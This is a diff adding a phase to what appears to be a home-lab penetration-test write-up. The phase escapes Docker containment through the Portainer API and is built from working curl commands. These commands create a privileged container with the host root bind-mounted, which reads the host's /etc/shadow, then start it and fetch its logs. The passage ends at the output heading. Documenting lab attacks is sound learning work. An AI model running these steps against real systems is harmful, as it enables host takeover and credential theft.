@@ -884,3 +884,108 @@ curl -sk https://10.0.40.10:9443/api/endpoints \
 | Total Memory | ~2.9 GB |
 
 Portainer is managing the local Docker socket directly. Endpoint ID **3** is the target for the next phase.
+
+## Phase 5 — Docker Container Escape via Portainer API
+
+With a valid JWT and endpoint ID 3 confirmed, I used the Portainer API to create a privileged container with the host filesystem mounted — a standard Docker API escape technique that bypasses all container isolation.
+
+---
+
+### 5.1 — Check Available Images
+
+Before creating the container I needed to know which images were already on the host — pulling a new one would require internet access and leave additional forensic evidence.
+
+```bash
+curl -sk https://10.0.40.10:9443/api/endpoints/3/docker/images/json \
+  -H "Authorization: Bearer <PORTAINER_JWT_REDACTED>"
+```
+
+<details><summary>Command explained</summary>
+
+| Component | Meaning |
+|---|---|
+| `/api/endpoints/3/docker/images/json` | Portainer proxy to Docker images API for endpoint 3 |
+| `-H "Authorization: Bearer <token>"` | JWT bearer auth |
+
+</details>
+
+**Images found on host:**
+
+| Image | Tag | Size |
+|---|---|---|
+| `httpd` | `2.4-alpine` | 97 MB |
+| `portainer/portainer-ce` | `lts` | 201 MB |
+| `ghcr.io/digininja/dvwa` | `latest` | 841 MB |
+| `mariadb` | `10` | 458 MB |
+| `hello-world` | `latest` | 25 KB |
+| `raesene/bwapp` | `latest` | 647 MB |
+
+I selected `httpd:2.4-alpine` — smallest image with a usable shell.
+
+---
+
+### 5.2 — Create Privileged Container with Host Filesystem Mounted
+
+```bash
+curl -sk -X POST https://10.0.40.10:9443/api/endpoints/3/docker/containers/create \
+  -H "Authorization: Bearer <PORTAINER_JWT_REDACTED>" \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"httpd:2.4-alpine","Cmd":["sh","-c","cat /host/etc/shadow"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
+```
+
+<details><summary>Command explained</summary>
+
+| Component | Meaning |
+|---|---|
+| `POST /api/endpoints/3/docker/containers/create` | Portainer proxy to Docker container create API |
+| `"Image":"httpd:2.4-alpine"` | Use existing image — no pull required |
+| `"Cmd":["sh","-c","cat /host/etc/shadow"]` | Command to run on container start — read host shadow file |
+| `"Binds":["/:/host"]` | Mount host root filesystem at `/host` inside the container |
+| `"Privileged":true` | Run container with full host privileges — bypasses seccomp, AppArmor, capability restrictions |
+
+</details>
+
+**Output:**
+```json
+{"Id":"21a30e90f7e0bcc81f3f578102a27a27727aae1ad59088db3ac5807718f3af51","Warnings":[]}
+```
+
+---
+
+### 5.3 — Start the Container
+
+```bash
+curl -sk -X POST https://10.0.40.10:9443/api/endpoints/3/docker/containers/21a30e90f7e0bcc81f3f578102a27a27727aae1ad59088db3ac5807718f3af51/start \
+  -H "Authorization: Bearer <PORTAINER_JWT_REDACTED>"
+```
+
+<details><summary>Command explained</summary>
+
+| Component | Meaning |
+|---|---|
+| `POST .../containers/<id>/start` | Start the container by ID — runs the Cmd specified at creation |
+| Empty response | Expected — Docker returns 204 No Content on successful start |
+
+</details>
+
+**Output:** *(empty — container started successfully)*
+
+---
+
+### 5.4 — Read Container Logs — Host `/etc/shadow`
+
+```bash
+curl -sk "https://10.0.40.10:9443/api/endpoints/3/docker/containers/21a30e90f7e0bcc81f3f578102a27a27727aae1ad59088db3ac5807718f3af51/logs?stdout=1&stderr=1" \
+  -H "Authorization: Bearer <PORTAINER_JWT_REDACTED>"
+```
+
+<details><summary>Command explained</summary>
+
+| Component | Meaning |
+|---|---|
+| `.../containers/<id>/logs` | Fetch stdout/stderr from the container after it ran and exited |
+| `?stdout=1&stderr=1` | Include both output streams |
+
+</details>
+
+**Output (excerpt — hashes redacted):**
